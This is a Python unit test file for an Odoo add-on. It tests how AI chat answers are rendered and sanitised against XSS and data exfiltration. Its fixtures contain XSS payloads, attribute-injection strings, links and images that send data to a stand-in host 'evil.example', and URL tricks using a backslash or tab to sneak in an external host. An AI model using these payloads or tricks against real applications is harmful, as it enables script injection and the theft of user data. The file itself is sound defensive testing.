# -*- coding: utf-8 -*-
import pathlib
import re
from unittest import mock

import lxml.html
from odoo.tests import BaseCase
from odoo.tools import html_sanitize

from ..engine import html_output
from ..engine.html_output import (
    agent_step_markup,
    input_card_markup,
    markdown_to_plaintext_title,
    notification_markup,
    render_ai_markdown,
    sanitize_ai_html,
    tool_summary_markup,
)

BASE_URL = 'https://example.com'
# What `fields.Html._convert` passes to `html_sanitize` when a `mail.message`
# body is written (`body = fields.Html('Contents', default='', sanitize_style=True)`
# in mail/models/mail_message.py, the other options at their defaults).
MAIL_BODY_SANITIZE = {
    'silent': True,
    'sanitize_tags': True,
    'sanitize_attributes': True,
    'sanitize_style': True,
    'sanitize_form': True,
    'sanitize_conditional_comments': True,
    'output_method': 'html',
    'strip_style': False,
    'strip_classes': False,
}


class TestRenderAiMarkdown(BaseCase):

    def test_table_gets_classes(self):
        html = render_ai_markdown("| a | b |\n| - | - |\n| 1 | 2 |\n")
        self.assertIn('o_ow_ai_table', html)
        self.assertIn('table-bordered', html)

    def test_fenced_code_kept_as_text(self):
        html = render_ai_markdown("```\nprint('hi')\n```")
        self.assertIn('print(', html)
        self.assertIn('o_ow_ai_pre', html)

    def test_fenced_code_keeps_its_language(self):
        # the chat highlights code blocks (Prism) from the `language-*` class
        html = render_ai_markdown("```python\nprint('hi')\n```")
        self.assertIn('language-python', html)
        self.assertIn('o_ow_ai_pre', html)

    def test_blockquote_gets_class(self):
        html = render_ai_markdown("> quoted text")
        self.assertIn('o_ow_ai_quote', html)

    def test_code_block_with_img_onerror_is_escaped_text(self):
        html = render_ai_markdown("```\n<img src=x onerror=alert(1)>\n```")
        self.assertNotIn('<img', html)
        self.assertIn('&lt;img', html)

    def test_minimal_fallback_paragraphs_and_bold(self):
        with mock.patch.object(html_output, 'markdown2', None):
            html = render_ai_markdown("Hello **world**\n\nSecond paragraph")
        self.assertIn('<p>', html)
        self.assertIn('<strong>world</strong>', html)
        self.assertIn('Second paragraph', html)


class TestExfiltrationFilter(BaseCase):

    def test_markdown_image_removed(self):
        html = render_ai_markdown("![x](https://evil.example/track?q=1)")
        self.assertNotIn('<img', html)

    def test_raw_img_removed(self):
        html = sanitize_ai_html('<img src="https://evil.example/x.png">')
        self.assertNotIn('<img', html)

    def test_external_link_becomes_span(self):
        html = sanitize_ai_html('<a href="https://evil.example/?d=1">click</a>', base_url=BASE_URL)
        self.assertNotIn('<a ', html)
        self.assertIn('o_ow_ai_extlink', html)
        self.assertIn('evil.example', html)

    def test_internal_web_hash_link_kept(self):
        html = sanitize_ai_html('<a href="/web#id=1">record</a>', base_url=BASE_URL)
        self.assertIn('<a href="/web#id=1"', html)

    def test_same_host_absolute_link_kept(self):
        html = sanitize_ai_html(
            f'<a href="{BASE_URL}/odoo/res.partner/1">ok</a>', base_url=BASE_URL)
        self.assertIn('<a ', html)
        self.assertIn(f'{BASE_URL}/odoo/res.partner/1', html)
        self.assertIn('target="_blank"', html)

    def test_script_removed(self):
        html = sanitize_ai_html('<p>hi</p><script>alert(1)</script>')
        self.assertNotIn('<script', html)
        self.assertNotIn('alert(1)', html)

    def test_inline_style_url_removed(self):
        html = sanitize_ai_html('<p style="background:url(https://evil.example)">hi</p>')
        self.assertNotIn('style=', html)
        self.assertNotIn('url(', html)

    def test_internal_image_kept(self):
        html = sanitize_ai_html('<img src="/web/image/5">')
        self.assertIn('<img', html)
        self.assertIn('/web/image/5', html)

    def test_mailto_kept(self):
        html = sanitize_ai_html('<a href="mailto:a@b.com">mail</a>')
        self.assertIn('mailto:a@b.com', html)

    def test_tel_kept(self):
        html = sanitize_ai_html('<a href="tel:+31201234567">call</a>', base_url=BASE_URL)
        self.assertIn('<a href="tel:+31201234567"', html)

    def test_protocol_relative_link_is_external(self):
        html = sanitize_ai_html('<a href="//evil.example/?d=1">click</a>', base_url=BASE_URL)
        self.assertNotIn('<a ', html)
        self.assertIn('o_ow_ai_extlink', html)

    def test_backslash_link_is_external(self):
        # Browsers read `/\evil.example` as `//evil.example`. (`html_sanitize`
        # already percent-encodes the backslash on Odoo 19, see below, so
        # check the filter on its own.)
        for href in ('/\\evil.example/?d=1', '\\\\evil.example/?d=1'):
            with self.subTest(href=href):
                html = html_output.strip_exfiltration(f'<a href="{href}">click</a>', BASE_URL)
                self.assertNotIn('<a ', html)
                self.assertIn('o_ow_ai_extlink', html)

    def test_sanitised_backslash_link_stays_on_this_host(self):
        # Odoo 19's `html_sanitize` (lxml on libxml2 2.9) percent-encodes a
        # backslash in an `href`. Browsers only read a literal backslash as
        # `/`, so `/%5Cevil.example/?d=1` is a path on this host and stays
        # a link; `%5C%5Cevil.example/?d=1` is not root-relative and is
        # still turned into text.
        html = sanitize_ai_html('<a href="/\\evil.example/?d=1">click</a>', base_url=BASE_URL)
        self.assertIn('<a href="/%5Cevil.example/?d=1">click</a>', html)
        self.assertNotIn('\\', html)
        html = sanitize_ai_html('<a href="\\\\evil.example/?d=1">click</a>', base_url=BASE_URL)
        self.assertNotIn('<a ', html)
        self.assertIn('o_ow_ai_extlink', html)

    def test_tab_after_leading_slash_is_external(self):
        # Browsers drop a tab inside a URL: `/<TAB>/evil.example` is
        # `//evil.example`. (`html_sanitize` already percent-encodes the tab,
        # so check the filter on its own.)
        html = html_output.strip_exfiltration('<a href="/\t/evil.example/?d=1">click</a>', BASE_URL)
        self.assertNotIn('<a ', html)
        self.assertIn('o_ow_ai_extlink', html)

    def test_protocol_relative_link_is_external_without_base_url(self):
        html = render_ai_markdown("[click](//evil.example/?d=1)")
        self.assertNotIn('<a ', html)

    def test_root_relative_link_kept(self):
        html = render_ai_markdown("[Acme](/odoo/res.partner/1)")
        self.assertIn('<a href="/odoo/res.partner/1"', html)

    def test_exfiltration_attributes_stripped(self):
        dirty = (
            '<a href="/odoo" ping="https://evil.example/ping">x</a>'
            '<table background="https://evil.example/bg.png"><tr><td>1</td></tr></table>'
            '<p srcset="https://evil.example/a.png 1x" poster="https://evil.example/p.png">t</p>'
            '<div formaction="https://evil.example/f">f</div>'
        )
        for html in (html_output.strip_exfiltration(dirty), sanitize_ai_html(dirty)):
            with self.subTest(html=html):
                for attribute in ('ping=', 'background=', 'srcset=', 'poster=', 'formaction=', 'evil.example'):
                    self.assertNotIn(attribute, html)
                self.assertIn('<a href="/odoo"', html)


class TestLeadingTextStaysEscaped(BaseCase):
    """Text before the first element (e.g. what is left of an unwrapped
    ``<form>``) must be written back escaped every time the HTML is parsed
    and serialised again, or each round decodes one level of entities."""

    SOURCES = {'1': {'url': 'https://www.odoo.com/page', 'title': 'Odoo', 'host': 'www.odoo.com'}}
    SINGLE = '<form>&lt;img src="https://evil.example/p?d=secret"&gt;</form><p>y</p>'
    DOUBLE = '<form>&amp;lt;img src="https://evil.example/p?d=secret"&amp;gt;</form>\n<p>y</p>\n\n'
    # the text a reader must see, and how it is written in the HTML
    SINGLE_TEXT = ('<img src="https://evil.example/p?d=secret">', '&lt;img src=')
    DOUBLE_TEXT = ('&lt;img src="https://evil.example/p?d=secret"&gt;', '&amp;lt;img src=')

    def assert_inert(self, html, visible, escaped):
        self.assertNotIn('<img', html)
        wrapper = lxml.html.fragment_fromstring(html, create_parent='div')
        self.assertFalse(wrapper.xpath('.//img'))
        for el in wrapper.iter():
            for value in el.attrib.values():
                self.assertNotIn('evil.example', value)
        self.assertIn(escaped, html)
        self.assertIn(visible, wrapper.text_content())

    def test_encoded_img_stays_text(self):
        for payload, (visible, escaped) in ((self.SINGLE, self.SINGLE_TEXT), (self.DOUBLE, self.DOUBLE_TEXT)):
            for tag in ('', 'A [WEB_SOURCE:1]'):
                text = payload + tag
                with self.subTest(text=text, render='markdown'):
                    html = str(render_ai_markdown(text, base_url=BASE_URL, web_sources=self.SOURCES))
                    self.assert_inert(html, visible, escaped)
                    if tag:
                        self.assertIn('class="o_ow_ai_cite"', html)
                with self.subTest(text=text, render='sanitize'):
                    self.assert_inert(str(sanitize_ai_html(text, base_url=BASE_URL)), visible, escaped)

    def test_ordinary_answers_render_as_before(self):
        html = str(render_ai_markdown(
            "AT&T is **bold**, see [partner](/odoo/res.partner/1) [WEB_SOURCE:1]",
            base_url=BASE_URL, web_sources=self.SOURCES))
        self.assertIn('AT&amp;T is <strong>bold</strong>', html)
        self.assertIn('<a href="/odoo/res.partner/1">partner</a>', html)
        self.assertIn('<sup class="o_ow_ai_cite"><a href="https://www.odoo.com/page" '
                      'rel="noopener noreferrer nofollow" target="_blank">1</a></sup>', html)
        html = str(sanitize_ai_html('AT&amp;T <b>bold</b> <a href="/odoo/res.partner/1">partner</a>'))
        self.assertEqual(html, '<p>AT&amp;T <b>bold</b> <a href="/odoo/res.partner/1">partner</a></p>')
        # ordinary leading text (left of an unwrapped <form>) reads the same, escaped once
        html = str(sanitize_ai_html('<form>AT&amp;T "q" it\'s</form><p>x</p>'))
        self.assertTrue(html.startswith('AT&amp;T '), html)
        wrapper = lxml.html.fragment_fromstring(html, create_parent='div')
        self.assertEqual(wrapper.text_content(), 'AT&T "q" it\'sx')


class TestModelClassesStripped(BaseCase):

    def test_overlay_classes_dropped(self):
        html = render_ai_markdown(
            '<div class="position-fixed top-0 start-0 w-100 h-100 o_ow_ai_input_card">Fake card</div>')
        self.assertIn('Fake card', html)
        self.assertNotIn('position-fixed', html)
        self.assertNotIn('o_ow_ai_input_card', html)
        self.assertNotIn('class=', html)

    def test_code_language_class_kept(self):
        html = render_ai_markdown("```sql\nSELECT 1\n```")
        self.assertIn('class="language-sql"', html)
        self.assertIn('o_ow_ai_pre', html)

    def test_raw_code_keeps_only_its_language_class(self):
        html = render_ai_markdown('<code class="language-js position-fixed">x()</code>')
        self.assertIn('class="language-js"', html)
        self.assertNotIn('position-fixed', html)


class TestSummaryMarkup(BaseCase):

    def test_tool_summary_markup(self):
        html = tool_summary_markup('check', 'Doing <thing>', 'call_1')
        self.assertIn('o_ow_ai_tool_summary', html)
        self.assertIn('data-id="call_1"', html)
        self.assertIn('&lt;thing&gt;', html)
        self.assertNotIn('data-oe-id', html)

    def test_tool_summary_markup_event_id(self):
        html = tool_summary_markup('check', 'Done', 'call_1', 7)
        self.assertIn('data-oe-id="7"', html)

    def test_tool_summary_markup_maps_the_icon_name_to_a_font_awesome_class(self):
        """Odoo 19 renders Font Awesome 4 classes (`data-icon` means nothing
        there): a tool's icon name becomes its `fa-*` class."""
        html = tool_summary_markup('search', 'Searched contacts', 'call_1')
        self.assertIn('<i class="fa fa-search" aria-hidden="true"></i>Searched contacts', html)
        self.assertNotIn('data-icon', html)

    def test_every_builtin_tool_icon_name_has_a_class(self):
        """Each icon name a builtin tool (`tools/*.py`) puts in its summary is mapped."""
        tools_dir = pathlib.Path(__file__).resolve().parent.parent / 'tools'
        names = {
            name for path in tools_dir.glob('*.py') for name in re.findall(r"'icon': '(\w+)'", path.read_text())}
        self.assertGreaterEqual(names, {
            'search', 'view_list', 'table', 'bar_chart', 'visibility', 'article', 'edit', 'add', 'check', 'help'})
        for name in sorted(names):
            with self.subTest(name=name):
                self.assertTrue(html_output.ICON_CLASSES[name].startswith('fa-'))

    def test_tool_summary_markup_unknown_icon_falls_back_to_a_cog(self):
        self.assertEqual(html_output.DEFAULT_ICON_CLASS, 'fa-cog')
        for icon in ('no_such_icon', '', None, '" onmouseover="alert(1)'):
            with self.subTest(icon=icon):
                html = tool_summary_markup(icon, 'Used a tool', 'call_1')
                self.assertIn('<i class="fa fa-cog" aria-hidden="true"></i>', html)
                self.assertNotIn('onmouseover', html)

    def test_tool_summary_markup_survives_html_sanitize(self):
        """The message body is sanitised on write: the icon's classes, the
        call id and the event id must come through it unchanged."""
        for icon, icon_class in (('bar_chart', 'fa fa-bar-chart'), ('no_such_icon', 'fa fa-cog')):
            with self.subTest(icon=icon):
                html = html_sanitize(str(tool_summary_markup(icon, 'Grouped sales', 'call_1', 7)))
                wrapper = lxml.html.fragment_fromstring(html, create_parent='div')
                summary = wrapper.find_class('o_ow_ai_tool_summary')[0]
                self.assertEqual(summary.get('data-id'), 'call_1')
                self.assertEqual(summary.get('data-oe-id'), '7')
                self.assertEqual(summary[0].tag, 'i')
                self.assertEqual(summary[0].get('class'), icon_class)
                self.assertEqual(summary.text_content(), 'Grouped sales')

    def test_input_card_markup(self):
        html = input_card_markup(sanitize_ai_html('<p>Sure?</p>'))
        self.assertEqual(str(html), '<div class="o_ow_ai_input_card"><p>Sure?</p></div>')

    def test_agent_step_markup(self):
        inner = render_ai_markdown("hi")
        html = agent_step_markup(inner, 42)
        self.assertIn('o_ow_ai_agent_step', html)
        self.assertIn('data-id="42"', html)

    def test_notification_markup(self):
        body = render_ai_markdown("hi")
        html = notification_markup('ow_ai_note', body)
        self.assertIn('data-oe-type="ow_ai_note"', html)
        self.assertIn('o_mail_notification', html)


class TestWebCitations(BaseCase):
    SOURCES = {'1': {'url': 'https://www.odoo.com/page', 'title': 'Odoo', 'host': 'www.odoo.com'},
               '2': {'url': 'https://example.org/x?y=1', 'title': 'Example', 'host': 'example.org'}}

    def test_tags_become_numbered_links_and_a_sources_list(self):
        html = str(render_ai_markdown(
            "Odoo 19 is out [WEB_SOURCE:1]. More [WEB_SOURCE:1,2].", web_sources=self.SOURCES))
        self.assertIn('<sup class="o_ow_ai_cite"><a href="https://www.odoo.com/page" '
                      'rel="noopener noreferrer nofollow" target="_blank">1</a></sup>', html)
        self.assertEqual(html.count('href="https://www.odoo.com/page"'), 3)   # 2 citations + sources list
        self.assertIn('<div class="o_ow_ai_sources">', html)
        self.assertIn('Example', html)
        self.assertIn('example.org', html)

    def test_unknown_and_unfetched_citations(self):
        html = str(render_ai_markdown("A [WEB_SOURCE:7] B [WEB_SOURCE:2]", web_sources=self.SOURCES))
        self.assertIn('<span class="o_ow_ai_cite_missing">[7]</span>', html)
        self.assertEqual(html.count('href="https://example.org/x?y=1"'), 2)   # citation + list; 7 absent from the list

    def test_model_written_external_links_stay_plain(self):
        html = str(render_ai_markdown(
            "See [evil](https://evil.example/?d=secret) [WEB_SOURCE:1]", web_sources=self.SOURCES))
        self.assertNotIn('href="https://evil.example', html)
        self.assertIn('evil (evil.example)', html)
        self.assertIn('href="https://www.odoo.com/page"', html)

    def test_no_sources_means_plain_text(self):
        html = str(render_ai_markdown("A [WEB_SOURCE:1]"))
        self.assertIn('[1]', html)
        self.assertNotIn('<sup', html)
        self.assertNotIn('o_ow_ai_sources', html)

    # -- beyond the brief: the list itself, and what the model cannot do --------

    def sources_list(self, html):
        wrapper = lxml.html.fragment_fromstring(html, create_parent='div')
        return wrapper.find_class('o_ow_ai_sources')

    def test_sources_list_in_order_of_first_citation_with_the_citation_numbers(self):
        html = str(render_ai_markdown(
            "First [WEB_SOURCE:2], then [WEB_SOURCE:1, 2] and [WEB_SOURCE:02].", web_sources=self.SOURCES))
        sources = self.sources_list(html)
        self.assertEqual(len(sources), 1)
        items = sources[0].findall('.//li')
        self.assertEqual([item.get('value') for item in items], ['2', '1'])
        self.assertEqual([item.find('a').get('href') for item in items],
                         ['https://example.org/x?y=1', 'https://www.odoo.com/page'])
        self.assertEqual([item.find('a').text for item in items], ['Example', 'Odoo'])
        self.assertEqual([item.find('span').text for item in items], ['example.org', 'www.odoo.com'])
        self.assertEqual(items[0].find('a').get('rel'), 'noopener noreferrer nofollow')
        self.assertEqual(items[0].find('a').get('target'), '_blank')
        self.assertEqual(html.count('class="o_ow_ai_cite"'), 4)   # 2, 1, 2, 02 (= 2)

    def test_uncited_sources_and_unknown_numbers_are_not_listed(self):
        html = str(render_ai_markdown("A [WEB_SOURCE:7]", web_sources=self.SOURCES))
        self.assertFalse(self.sources_list(html))
        self.assertNotIn('href=', html)
        html = str(render_ai_markdown("No citation at all.", web_sources=self.SOURCES))
        self.assertNotIn('o_ow_ai_sources', html)

    def test_citation_inside_a_list_item(self):
        html = str(render_ai_markdown("- Odoo 19 [WEB_SOURCE:1]\n- Other\n", web_sources=self.SOURCES))
        wrapper = lxml.html.fragment_fromstring(html, create_parent='div')
        item = wrapper.find('ul').find('li')
        self.assertEqual(item.find('sup').get('class'), 'o_ow_ai_cite')
        self.assertEqual(item.find('sup/a').get('href'), 'https://www.odoo.com/page')

    def test_placeholder_characters_written_by_the_model_are_dropped(self):
        html = str(render_ai_markdown("A \ue000WS:1\ue001 B \ue000WS:2", web_sources=self.SOURCES))
        self.assertNotIn('href=', html)
        self.assertNotIn('o_ow_ai_sources', html)
        self.assertNotIn('\ue000', html)
        self.assertNotIn('\ue001', html)

    def test_entity_encoded_placeholders_are_not_citations(self):
        """``&#xE000;`` decodes to the placeholder character once the HTML is
        parsed: without this call's nonce it is still no citation."""
        for text in ("A &#xE000;WS:1&#xE001; B", "A &#57344;WS:1&#57345; B",
                     "A &#xE000;WS:0123456789abcdef:1&#xE001; B", "<p>A &#xe000;WS:1&#xe001;</p>"):
            with self.subTest(text=text):
                html = str(render_ai_markdown(text, web_sources=self.SOURCES))
                self.assertNotIn('href=', html)
                self.assertNotIn('o_ow_ai_cite', html)
                self.assertNotIn('o_ow_ai_sources', html)
                self.assertNotIn('\ue000', html)
                self.assertNotIn('\ue001', html)
        html = str(render_ai_markdown("A &#xE000;WS:1&#xE001; B [WEB_SOURCE:2]", web_sources=self.SOURCES))
        self.assertNotIn('href="https://www.odoo.com/page"', html)
        self.assertEqual(html.count('href="https://example.org/x?y=1"'), 2)

    def test_title_and_host_are_escaped(self):
        sources = {'1': {'url': 'https://example.org/"><img src=x>', 'title': '<img src=x onerror=alert(1)>',
                         'host': '<b>example.org</b>'}}
        html = str(render_ai_markdown("A [WEB_SOURCE:1]", web_sources=sources))
        self.assertNotIn('<img', html)
        self.assertNotIn('<b>', html)
        self.assertIn('&lt;img src=x onerror=alert(1)&gt;', html)
        self.assertIn('&lt;b&gt;example.org&lt;/b&gt;', html)
        wrapper = lxml.html.fragment_fromstring(html, create_parent='div')
        self.assertEqual(wrapper.find('.//sup/a').get('href'), 'https://example.org/"><img src=x>')

    def test_only_http_urls_become_links(self):
        sources = {'1': {'url': 'javascript:alert(1)', 'title': 'x', 'host': ''},
                   '2': {'url': '//evil.example/x', 'title': 'y', 'host': 'evil.example'},
                   '3': {'url': 'HTTPS://example.org/', 'title': 'z', 'host': 'example.org'}}
        html = str(render_ai_markdown("A [WEB_SOURCE:1,2,3]", web_sources=sources))
        self.assertIn('<span class="o_ow_ai_cite_missing">[1]</span>', html)
        self.assertIn('<span class="o_ow_ai_cite_missing">[2]</span>', html)
        self.assertNotIn('javascript', html)
        self.assertNotIn('evil.example', html)
        self.assertEqual(html.count('href="HTTPS://example.org/"'), 2)

    def test_empty_title_falls_back_to_the_host(self):
        sources = {'1': {'url': 'https://example.org/a', 'title': '', 'host': 'example.org'}}
        html = str(render_ai_markdown("A [WEB_SOURCE:1]", web_sources=sources))
        self.assertEqual(self.sources_list(html)[0].find('.//a').text, 'example.org')

    def test_tag_in_an_attribute_stays_text(self):
        html = str(render_ai_markdown('<span title="x [WEB_SOURCE:1]">y</span> [WEB_SOURCE:2]',
                                      web_sources=self.SOURCES))
        wrapper = lxml.html.fragment_fromstring(html, create_parent='div')
        titled = [el for el in wrapper.iter() if el.get('title') is not None]
        self.assertEqual([el.get('title') for el in titled], ['x [1]'])
        self.assertNotIn('href="https://www.odoo.com/page"', html)
        self.assertEqual(html.count('href="https://example.org/x?y=1"'), 2)

    def test_tag_in_code_is_a_citation_too(self):
        # still only a trusted link: the code block's text is the model's, the link the table's
        html = str(render_ai_markdown("`see [WEB_SOURCE:1]`", web_sources=self.SOURCES))
        self.assertIn('href="https://www.odoo.com/page"', html)

    def test_minimal_fallback_renders_citations(self):
        with mock.patch.object(html_output, 'markdown2', None):
            html = str(render_ai_markdown("Odoo [WEB_SOURCE:1]", web_sources=self.SOURCES))
        self.assertIn('<sup class="o_ow_ai_cite"><a href="https://www.odoo.com/page"', html)
        self.assertIn('o_ow_ai_sources', html)

    def test_survives_the_mail_body_sanitiser(self):
        """The answer is stored as a ``mail.message`` body, sanitised on write."""
        html = html_sanitize(
            str(render_ai_markdown("A [WEB_SOURCE:2] B [WEB_SOURCE:9]", web_sources=self.SOURCES)),
            **MAIL_BODY_SANITIZE)
        self.assertIn('<sup class="o_ow_ai_cite"><a href="https://example.org/x?y=1" '
                      'rel="noopener noreferrer nofollow" target="_blank">2</a></sup>', html)
        self.assertIn('<span class="o_ow_ai_cite_missing">[9]</span>', html)
        self.assertIn('<li value="2">', html)
        self.assertIn('<div class="o_ow_ai_sources">', html)


class TestMarkdownToPlaintextTitle(BaseCase):

    def test_strips_markdown(self):
        title = markdown_to_plaintext_title("**Refund** for [order](https://x)")
        self.assertNotIn('*', title)
        self.assertNotIn('[', title)
        self.assertIn('Refund', title)


class TestMarkupGuard(BaseCase):
    """Only ``engine/html_output.py`` (and tests) may construct ``Markup(``."""

    def test_only_html_output_constructs_markup(self):
        root = pathlib.Path(__file__).resolve().parent.parent
        offenders = []
        for path in root.rglob('*.py'):
            relative = path.relative_to(root)
            if relative.parts[0] == 'tests':
                continue
            if str(relative) == 'engine/html_output.py':
                continue
            source = path.read_text()
            if 'Markup(' in source:
                offenders.append(str(relative))
        self.assertFalse(offenders, f"Markup( used outside engine/html_output.py: {offenders}")
